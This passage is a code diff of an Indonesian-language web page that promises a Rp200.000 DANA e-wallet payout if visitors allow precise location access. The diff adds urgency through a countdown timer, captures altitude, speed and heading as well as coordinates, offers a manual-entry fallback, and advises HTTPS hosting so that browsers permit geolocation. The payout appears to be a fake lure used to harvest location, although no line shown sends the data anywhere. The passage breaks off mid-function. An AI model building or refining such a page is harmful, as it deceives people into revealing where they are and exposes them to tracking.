@@ -202,14 +202,21 @@
       cursor: pointer;
       margin-top: 8px;
       box-shadow: 0 6px 20px rgba(10,47,255,0.35);
+      transition: all 0.3s;
     }
     .allow-btn:active { transform: scale(0.97); }
+    .allow-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
     .skip-btn {
       width: 100%; padding: 12px;
       background: none; border: none;
       color: #aaa; font-size: 13px;
       cursor: pointer; margin-top: 6px;
     }
+    .skip-btn:hover { color: #666; }
 
     /* SUCCESS */
     .success-overlay {
@@ -220,34 +227,76 @@
       align-items: center; justify-content: center;
       padding: 32px;
       display: none;
+      overflow-y: auto;
     }
     .success-overlay.show { display: flex; }
     .success-icon { font-size: 72px; margin-bottom: 16px; }
     .success-overlay h2 { font-size: 22px; font-weight: 800; color: #1a1a2e; margin-bottom: 8px; text-align: center; }
-    .success-overlay p { font-size: 14px; color: #666; text-align: center; line-height: 1.6; margin-bottom: 24px; }
+    .success-overlay p { font-size: 14px; color: #666; text-align: center; line-height: 1.6; margin-bottom: 24px; max-width: 400px; }
     .coord-box {
       background: #f0f4ff;
       border-radius: 12px;
       padding: 16px;
       width: 100%;
+      max-width: 400px;
       font-size: 13px;
       color: #333;
+      margin-bottom: 16px;
     }
     .coord-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
     .coord-row:last-child { margin-bottom: 0; }
     .coord-key { color: #888; }
     .coord-val { font-weight: 700; color: #0a2fff; }
+    .coord-val.success { color: #00b36b; }
+    .coord-val.warning { color: #ff9800; }
+    
     .maps-btn {
-      display: block; width: 100%; padding: 14px;
+      display: block; width: 100%; max-width: 400px; padding: 14px;
       background: linear-gradient(135deg, #0a2fff, #00aaff);
       color: #fff; border: none; border-radius: 14px;
       font-size: 15px; font-weight: 700;
       text-align: center; text-decoration: none;
-      margin-top: 16px;
+      margin-top: 8px;
+    }
+    .close-success {
+      display: block; width: 100%; max-width: 400px; padding: 12px;
+      background: none; border: none;
+      color: #999; font-size: 13px;
+      cursor: pointer; margin-top: 8px;
+    }
+    .close-success:hover { color: #666; }
+
+    /* PROTOCOL WARNING */
+    .protocol-warning {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      border-radius: 12px;
+      padding: 12px 16px;
+      margin: 12px 20px;
+      color: #856404;
+      font-size: 13px;
+      display: none;
+      text-align: center;
+    }
+    .protocol-warning.show { display: block; }
+    .protocol-warning strong { display: block; margin-bottom: 4px; }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .hero h1 { font-size: 24px; }
+      .nominal-amount { font-size: 34px; }
+      .popup { padding: 24px 16px 32px; }
     }
   </style>
 </head>
 <body>
+
+<!-- PROTOCOL WARNING -->
+<div class="protocol-warning" id="protocolWarning">
+  <strong>⚠️ Koneksi Tidak Aman (HTTP)</strong>
+  Browser memblokir akses lokasi karena website menggunakan HTTP.<br>
+  <strong>Solusi:</strong> Hosting di <strong>Netlify</strong> atau <strong>Vercel</strong> (gratis & HTTPS).
+</div>
 
 <!-- HEADER -->
 <div class="header">
@@ -326,32 +375,66 @@
       <div class="step-text">Setelah lokasi terverifikasi, dana <strong>Rp200.000</strong> langsung diproses ke akun DANA kamu.</div>
     </div>
 
-    <button class="allow-btn" onclick="requestLocation()">📍 Izinkan Lokasi & Klaim Dana</button>
+    <button class="allow-btn" id="allowBtn" onclick="requestLocation()">📍 Izinkan Lokasi & Klaim Dana</button>
     <button class="skip-btn" onclick="hidePopup()">Nanti saja</button>
   </div>
 </div>
 
 <!-- SUCCESS OVERLAY -->
 <div class="success-overlay" id="successOverlay">
-  <div class="success-icon">📌</div>
-  <h2>Lokasi Berhasil Diverifikasi!</h2>
-  <p>Terima kasih. Data lokasi kamu telah tercatat. Proses pencairan dana sedang berjalan.</p>
-  <div class="coord-box" id="coordBox"></div>
+  <div class="success-icon" id="successIcon">📌</div>
+  <h2 id="successTitle">Lokasi Berhasil Diverifikasi!</h2>
+  <p id="successDesc">Terima kasih. Data lokasi kamu telah tercatat. Proses pencairan dana sedang berjalan.</p>
+  <div class="coord-box" id="coordBox">
+    <div style="text-align:center;color:#999;padding:12px 0;">
+      ⏳ Mengambil data lokasi...
+    </div>
+  </div>
   <a class="maps-btn" id="mapsLink" href="#" target="_blank">🗺️ Lihat Lokasi di Maps</a>
+  <button class="close-success" onclick="closeSuccess()">Tutup</button>
 </div>
 
 <script>
-  // Countdown timer
+  // ============================================
+  // 1. CEK PROTOCOL (HTTP vs HTTPS)
+  // ============================================
+  (function checkProtocol() {
+    if (window.location.protocol !== 'https:') {
+      document.getElementById('protocolWarning').classList.add('show');
+      console.warn('⚠️ Website menggunakan HTTP. Lokasi tidak akan berfungsi!');
+    } else {
+      console.log('✅ Protocol HTTPS - Lokasi siap digunakan');
+    }
+  })();
+
+  // ============================================
+  // 2. COUNTDOWN TIMER
+  // ============================================
   let totalSecs = 9 * 60 + 59;
-  setInterval(() => {
-    if (totalSecs <= 0) return;
+  const countdownInterval = setInterval(() => {
+    if (totalSecs <= 0) {
+      clearInterval(countdownInterval);
+      document.getElementById('countdown').textContent = '00:00';
+      document.querySelector('.claim-btn').textContent = '⏰ Waktu Habis';
+      document.querySelector('.claim-btn').style.opacity = '0.5';
+      document.querySelector('.claim-btn').style.cursor = 'not-allowed';
+      return;
+    }
     totalSecs--;
     const m = String(Math.floor(totalSecs / 60)).padStart(2, '0');
     const s = String(totalSecs % 60).padStart(2, '0');
     document.getElementById('countdown').textContent = `${m}:${s}`;
   }, 1000);
 
+  // ============================================
+  // 3. POPUP FUNCTIONS
+  // ============================================
   function showPopup() {
+    // Cek protocol dulu
+    if (window.location.protocol !== 'https:') {
+      alert('⚠️ Website menggunakan HTTP!\n\nLokasi tidak bisa diakses.\n\nSolusi: Hosting di Netlify/Vercel (gratis & HTTPS)');
+      return;
+    }
     document.getElementById('overlay').classList.add('show');
   }
 
@@ -359,39 +442,152 @@
     document.getElementById('overlay').classList.remove('show');
   }
 
+  // ============================================
+  // 4. REQUEST LOCATION (MAIN FUNCTION)
+  // ============================================
   function requestLocation() {
-    if (!navigator.geolocation) {
-      alert('Browser tidak mendukung lokasi. Coba gunakan Chrome.');
+    const btn = document.getElementById('allowBtn');
+    
+    // Cek HTTPS
+    if (window.location.protocol !== 'https:') {
+      alert('⚠️ Website menggunakan HTTP!\n\nLokasi tidak bisa diakses.\n\nSolusi: Hosting di Netlify/Vercel (gratis & HTTPS)');
       return;
     }
+
+    // Cek support browser
+    if (!navigator.geolocation) {
+      alert('❌ Browser tidak mendukung Geolocation.\n\nGunakan Chrome, Firefox, atau Edge terbaru.');
+      return;
+    }
+
+    // Disable button & show loading
+    btn.textContent = '⏳ Mengambil lokasi...';
+    btn.disabled = true;
+
     navigator.geolocation.getCurrentPosition(
+      // ===== SUCCESS =====
       function(pos) {
         hidePopup();
+        
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
+        const alt = pos.coords.altitude || 'Tidak tersedia';
+        const speed = pos.coords.speed || 'Tidak tersedia';
+        const heading = pos.coords.heading || 'Tidak tersedia';
 
+        // Tampilkan data di success overlay
         document.getElementById('coordBox').innerHTML = `
-          <div class="coord-row"><span class="coord-key">Latitude</span><span class="coord-val">${lat.toFixed(6)}</span></div>
-          <div class="coord-row"><span class="coord-key">Longitude</span><span class="coord-val">${lon.toFixed(6)}</span></div>
-          <div class="coord-row"><span class="coord-key">Akurasi</span><span class="coord-val">±${Math.round(acc)} meter</span></div>
-          <div class="coord-row"><span class="coord-key">Waktu</span><span class="coord-val">${new Date().toLocaleString('id-ID')}</span></div>
+          <div class="coord-row">
+            <span class="coord-key">🌐 Latitude</span>
+            <span class="coord-val">${lat.toFixed(7)}</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">🌐 Longitude</span>
+            <span class="coord-val">${lon.toFixed(7)}</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">📏 Akurasi</span>
+            <span class="coord-val">±${Math.round(acc)} meter</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">📐 Altitude</span>
+            <span class="coord-val">${alt}</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">🚀 Kecepatan</span>
+            <span class="coord-val">${speed}</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">🧭 Heading</span>
+            <span class="coord-val">${heading}</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">🕐 Waktu</span>
+            <span class="coord-val">${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</span>
+          </div>
+          <div class="coord-row">
+            <span class="coord-key">✅ Status</span>
+            <span class="coord-val success">Berhasil</span>
+          </div>
         `;
+        
+        // Update Maps link
         document.getElementById('mapsLink').href = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // Tampilkan success overlay
         document.getElementById('successOverlay').classList.add('show');
+        
+        // Reset button
+        btn.textContent = '📍 Izinkan Lokasi & Klaim Dana';
+        btn.disabled = false;
+        
+        console.log('✅ Lokasi berhasil:', { lat, lon, acc });
       },
+      
+      // ===== ERROR =====
       function(err) {
-        const pesan = {
-          1: 'Izin lokasi ditolak.\n\nCara aktifkan:\n1. Ketuk ikon kunci/info di address bar\n2. Pilih Izin Situs\n3. Lokasi → Izinkan\n4. Refresh halaman & coba lagi',
-          2: 'Lokasi tidak terdeteksi. Pastikan GPS aktif.',
-          3: 'Waktu habis. Pastikan GPS menyala lalu coba lagi.',
-        };
-        alert(pesan[err.code] || 'Gagal mendapatkan lokasi.');
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-  }
-</script>
-
-</body>
-</html>
+        // Reset button
+        btn.textContent = '📍 Izinkan Lokasi & Klaim Dana';
+        btn.disabled = false;
+        
+        let pesan = '';
+        let solusi = '';
+        
+        switch(err.code) {
+          case 1: // PERMISSION_DENIED
+            pesan = '❌ Izin lokasi ditolak oleh pengguna.';
+            solusi = 'Cara mengaktifkan:\n' +
+                     '1. Ketuk ikon 🔒 atau ⓘ di address bar\n' +
+                     '2. Pilih "Izin Situs" / "Permissions"\n' +
+                     '3. Cari "Lokasi" → pilih "Izinkan" / "Allow"\n' +
+                     '4. Refresh halaman (F5) & coba lagi';
+            break;
+          case 2: // POSITION_UNAVAILABLE
+            pesan = '❌ Lokasi tidak dapat dideteksi.';
+            solusi = 'Pastikan:\n' +
+                     '• GPS aktif di perangkat\n' +
+                     '• Berada di ruang terbuka\n' +
+                     '• Koneksi internet stabil';
+            break;
+          case 3: // TIMEOUT
+            pesan = '❌ Waktu pengambilan lokasi habis.';
+            solusi = 'Pastikan GPS aktif dan sinyal kuat, lalu coba lagi.';
+            break;
+          default:
+            pesan = `❌ Error: ${err.message}`;
+            solusi = 'Coba refresh halaman atau gunakan browser lain.';
+        }
+        
+        alert(`${pesan}\n\n💡 ${solusi}`);
+        
+        // Tawarkan input manual jika gagal
+        if (confirm('💡 Ingin memasukkan lokasi secara manual?')) {
+          const lat = prompt('Masukkan Latitude (contoh: -6.2088):');
+          const lon = prompt('Masukkan Longitude (contoh: 106.8456):');
+          
+          if (lat && lon && !isNaN(lat) && !isNaN(lon)) {
+            hidePopup();
+            document.getElementById('coordBox').innerHTML = `
+              <div class="coord-row">
+                <span class="coord-key">🌐 Latitude</span>
+                <span class="coord-val">${lat}</span>
+              </div>
+              <div class="coord-row">
+                <span class="coord-key">🌐 Longitude</span>
+                <span class="coord-val">${lon}</span>
+              </div>
+              <div class="coord-row">
+                <span class="coord-key">⚠️ Status</span>
+                <span class="coord-val warning">Manual</span>
+              </div>
+              <div class="coord-row">
+                <span class="coord-key">🕐 Waktu</span>
+                <span class="coord-val">${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</span>
+              </div>
+            `;
+            document.getElementById('mapsLink').href = `https://www.google.com/maps?q=${lat},${lon}`;
+            document.getElementById('successOverlay').classList.add('show');
+            document.getElementById('successIcon').textContent = '📍';
+            document.getElementById('successTitle').textContent = 'Lokasi Manual Dimasukkan!';
+           
